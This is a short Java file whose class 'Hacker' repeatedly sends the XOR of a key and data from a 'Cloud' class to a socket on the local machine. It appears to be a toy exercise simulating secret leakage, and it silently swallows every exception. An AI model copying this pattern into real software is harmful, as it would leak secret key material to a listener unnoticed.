import java.io.*;
import java.net.*;

class Hacker implements Runnable {
	@Override
	public void run() {
		try {
			while (true) {
				Socket s = new Socket(InetAddress.getLoopbackAddress(), 11111);
				OutputStream os = s.getOutputStream();
				int a = Cloud.getKey() ^ Cloud.getData();
				os.write(String.valueOf(a).getBytes());
				os.flush();
				s.close();
				while (a == (Cloud.getKey() ^ Cloud.getData()))
					;
			}

		} catch (Exception e) {
		}
	}

}
